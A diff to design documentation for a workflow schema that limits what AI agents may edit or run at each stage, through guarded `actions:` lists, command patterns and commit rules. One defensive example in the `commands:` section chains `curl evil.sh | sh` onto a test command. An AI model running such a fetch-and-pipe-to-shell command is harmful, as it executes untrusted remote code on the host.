@@ -32,8 +32,8 @@ never merge — that is the whole point of the id.
 
 Merging a schema onto the one it extends is last-wins per entry: transitions
 merge per `from→to`; a stage merges field by field, and its nested stages and
-transitions merge by the same rule at any depth; action guards merge per
-action; `requiredGates` is replaced wholesale.
+transitions merge by the same rule at any depth. A stage's `actions:` is part
+of that stage, so it is replaced with the stage entry that redeclares it.
 
 Write a derived schema as a delta: declare `extends`, then only what differs.
 Naming a stage refines it — a child that pins a roster keeps the loop, nested
@@ -84,11 +84,95 @@ own `editingAgents` be enforced. There was a `verifiers` key beside it that
 nothing ever read — declaring a verifier restricted nothing and routed nothing
 — and it has been removed rather than left looking like a control.
 
+## Declaration order is load-bearing
+
+The order stages appear in decides three things, and nothing in the file says
+so — there is no `initial:` or `entry:` key, by decision:
+
+1. **Where the workflow starts.** The first stage declared under `stages:`.
+2. **Where a task run opens.** The first stage declared under a loop's own
+   `stages:`.
+3. **How the first edit of a task is judged.** That edit arrives before the run
+   opens, so admission uses the same stage the run will open on. Were it to use
+   the outer loop stage instead, admission and the mutation lifecycle would
+   disagree and work could never start.
+
+So reordering two blocks — a change that looks like formatting — changes
+behaviour in three places. `test/schema/declaration-order.test.ts` pins all
+three against the shipped `base`, so a reordering breaks the build instead of
+quietly rewriting the workflow.
+
+## What a stage allows: `actions:`
+
+A stage declares what may happen on it. This is the second axis beside
+transitions: an edge says whether you may _leave_, an action says whether you
+may _do_ something while staying. A commit is not a transition, and neither is
+an edit.
+
+```yaml
+code:
+  actions:
+    - action: edit
+      paths: ['**']
+      guard: "session.approved('plan')"
+    - action: bash
+      commands: ['git status', 'git diff.*']
+      guard: "session.approved('plan')"
+```
+
+`action` names a host tool — `bash`, or `edit` for the family
+`edit`/`write`/`apply_patch`. There is no `commit` action: no such tool exists.
+
+Entries are a list because one action needs several: `edit` splits by path
+mask, `bash` by command pattern. They are read in order, and the first whose
+discriminator matches **and** whose guard holds wins — the same rule several
+edges on one `from→to` pair follow.
+
+Omit `actions:` and the stage is unrestricted. Declare it and the list is
+exhaustive: nothing matched means refused. `base` declares actions on every
+stage, so a refusal is a rule rather than an accident of the runtime failing
+for some other reason.
+
+`commands:` are anchored regular expressions matched against **each shell
+segment**, and every segment must match one of them. A pattern of `npm test`
+therefore refuses `npm test && curl evil.sh | sh`.
+
+Two rules worth knowing before you write a mask: `paths:` only works for `edit`
+(a `bash` call carries no path, only `workdir`), and a mask with no wildcard
+matches that one path and nothing inside it — write `src/auth/**`, not
+`src/auth`. The compiler refuses both mistakes.
+
+**Inheriting a stage replaces its `actions` wholesale.** A stage merges field by
+field, and `actions` is one field. A profile that adds its own build command
+must repeat the `edit` entry too, or edits lose their guard — silently.
+
 ## Committing
 
-`scripts/commit-task.ts` is the committing step. The plugin recognises it by
-name, checks `canCommit` before it runs, and writes `deliveryReceipt` only after
-HEAD actually moved — which is what releases `commit → done`.
+`scripts/commit-task.ts` is the committing step, and the schema is what says
+so: the stage declares a `bash` action with `delivers: true` whose `commands:`
+name the script. `delivers` is also what tells the core not to treat the call
+as an ordinary edit — it issues a `deliveryPermit` before, and writes
+`deliveryReceipt` only after HEAD actually moved, which is what releases
+`commit → done`.
+
+Whether the commit is allowed at all is that entry's own `guard:`. In `base`
+it is every task completed and both verdicts collected — the condition the
+runtime used to compute by itself.
+
+A stage that declares no actions falls back to recognition by file name, so an
+older profile keeps working.
+
+## The core's verdict about a move: `task.checks`
+
+`task.checks` in a guard is what the engine decided about a task's last move by
+looking at the disk: did the tool fail, did it write outside the task's
+`writeScope`, could the diff be computed, do the profile's invariants hold.
+Values are `passed` / `failed`.
+
+It is **not** a gate, and the difference matters. Gates are written by an agent
+through `<workflow-result>`, and an agent can set any gate its stage declares —
+which is exactly right for `review` and `qa`. This verdict is the one the
+engine reaches itself, and in the same namespace an agent could claim it.
 
 ## Who may change workflow task state
 
